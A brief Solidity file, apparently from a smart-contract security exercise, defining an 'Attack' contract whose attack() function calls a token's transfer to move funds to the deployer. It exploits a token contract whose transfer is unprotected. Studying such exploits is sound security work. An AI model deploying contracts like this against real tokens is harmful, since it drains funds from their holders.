// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

interface IMyToken {
    function transfer(address _recipient, uint _amount) external;
}

contract Attack {
    IMyToken token;
    address owner;

    constructor(IMyToken _token) {
        token = IMyToken(_token);
        owner = msg.sender;
    }

    function attack() public {
        token.transfer(owner, address(token).balance);
    }
}
